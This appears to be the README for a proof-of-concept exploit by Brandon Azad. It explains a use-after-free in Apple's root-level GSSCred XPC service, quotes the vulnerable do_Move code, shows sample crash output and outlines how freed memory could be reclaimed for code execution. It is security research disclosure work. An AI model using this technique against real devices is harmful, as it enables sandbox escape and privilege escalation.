# GSSCred-move-uaf

<!-- Brandon Azad -->

The `com.apple.GSSCred` XPC service, which runs as root on macOS and iOS, does not properly
implement the "move" command, leading to a use-after-free condition in the `do_Move` function.
The GSSCred service can be reached from within the default application sandbox on iOS.

This program leverages the vulnerability in order to crash the GSSCred service. Achieving code
execution in GSSCred hinges on overwriting the freed memory with controlled data during the race
window. Tested on macOS High Sierra 10.13.2 Beta 17C79a.

## The vulnerability

Here are the relevant parts of `do_Move` from [Heimdal-520][server.m], with some unimportant
error-checking omitted:

[server.m]: https://opensource.apple.com/source/Heimdal/Heimdal-520/lib/heimcred/server.m.auto.html

```c
//
// 1. from and to are fully controlled UUID objects deserialized from the XPC request.
//
CFUUIDRef from = HeimCredMessageCopyAttributes(request, "from", CFUUIDGetTypeID());
CFUUIDRef to = HeimCredMessageCopyAttributes(request, "to", CFUUIDGetTypeID());
...
//
// 2. credfrom and credto are HeimCredRef objects looked up by the from and to UUIDs.
//    CFDictionaryGetValue() returns the objects without adding a reference. Note that if
//    the from and to UUIDs are the same, then credfrom and credto will both reference the
//    same object.
//
HeimCredRef credfrom = (HeimCredRef)CFDictionaryGetValue(peer->session->items, from);
HeimCredRef credto = (HeimCredRef)CFDictionaryGetValue(peer->session->items, to);
...
//
// 3. credfrom is removed from the dictionary. Since there was only one reference
//    outstanding, this causes credfrom to be freed.
//
CFMutableDictionaryRef newattrs = CFDictionaryCreateMutableCopy(NULL, 0, credfrom->attributes);
CFDictionaryRemoveValue(peer->session->items, from);
credfrom = NULL;
...
//
// 4. At this point we check credto. If credfrom and credto refer to the same object, then 
//    credto is a non-NULL pointer to the freed HeimCredRef object.
//
if (credto == NULL) {
	...
} else {
	//
	// 5. Now we dereference credto, passing a value read from freed memory as a
	//    CFDictionaryRef object to CFDictionaryGetValue().
	//
	CFUUIDRef parentUUID = CFDictionaryGetValue(credto->attributes, kHEIMAttrParentCredential);
	...
}
```

This code does the following:

1. It deserializes two UUIDs, `from` and `to`, from the XPC request. The request is completely
   controlled, so we can set the values of these UUIDs arbitrarily. There is no check of whether
   these two UUIDs are the same.
2. It looks up the HeimCredRef objects, `credfrom` and `credto`, corresponding to the respective
   UUIDs `from` and `to`. The `peer->session->items` dictionary stores all the credentials managed
   by GSSCred on behalf of the currently connected client program. Note that the function
   `CFDictionaryGetValue` returns a reference to the HeimCredRef objects, but does not increase
   their reference count. In particular, if `from` and `to` are the same UUID, then `credfrom` and
   `credto` will both point to the same HeimCredRef with a reference count of 1 (held by the
   containing CFDictionary).
3. Next `credfrom` is removed from the `peer->session->items` dictionary. This is usually safe,
   because when `from` and `to` are different UUIDs, the `credfrom` object will be freed and then
   is never referenced again. However, when `from` and `to` are the same, there will be problems,
   since `credto` is referenced later.
4. Next the code checks if `credto` is `NULL`. Since `credfrom` and `credto` are equal and
   `credfrom` was not `NULL`, we enter the `else` branch.
5. Finally, the code dereferences `credto` to read the `attributes` field, which is passed as the
   first parameter to `CFDictionaryGetValue`. If the freed memory pointed to by `credto` has been
   reallocated in the meantime and the location of the `attributes` field changed to point to a
   specially crafted fake CFDictionary object, then it should be possible to achieve code
   execution with this step.

This program does not attempt to win this race window. Instead, it lets the destructor for
HeimCredRef zero out the attributes field, triggering a `NULL` pointer dereference in
`CFDictionaryGetValue`.

## Usage

To build, run `make`. See the top of the Makefile for various build options.

Running the exploit will show the sequence of XPC messages exchanged with GSSCred:

```
$ ./GSSCred-move-uaf
create: <dictionary: 0x7ff359e07740> { count = 1, transaction: 0, voucher = 0x0, contents =
        "attributes" => <dictionary: 0x7ff359e06b60> { count = 5, transaction: 0, voucher = 0x0, contents =
                "kHEIMObjectType" => <string: 0x7ff359e06a00> { length = 19, contents = "kHEIMObjectKerberos" }
                "kHEIMAttrBundleIdentifierACL" => <array: 0x7ff359e06a70> { count = 1, capacity = 1, contents =
                        0: <string: 0x7ff359e06aa0> { length = 1, contents = "*" }
                }
                "kHEIMAttrUUID" => <uuid: 0x7ff359e06b20> AB000000-0000-0000-0000-000000000000
                "kHEIMAttrStoreTime" => <date: 0x7ff359e06c60> Sat Dec 09 15:09:56 2017 PST (approx)
                "kHEIMAttrType" => <string: 0x7ff359e06ce0> { length = 17, contents = "kHEIMTypeKerberos" }
        }
}
Event: <error: 0x7fff9959cc60> { count = 1, transaction: 0, voucher = 0x0, contents =
        "XPCErrorDescription" => <string: 0x7fff9959cfd0> { length = 22, contents = "Connection interrupted" }
}
move: <error: 0x7fff9959cc60> { count = 1, transaction: 0, voucher = 0x0, contents =
        "XPCErrorDescription" => <string: 0x7fff9959cfd0> { length = 22, contents = "Connection interrupted" }
}
```

The "Connection interrupted" XPC events indicate that the XPC connection was interrupted, likely
because GSSCred died.

## License

The GSSCred-move-uaf code is released into the public domain. As a courtesy I ask that if you
reference or use any of this code you attribute it to me.
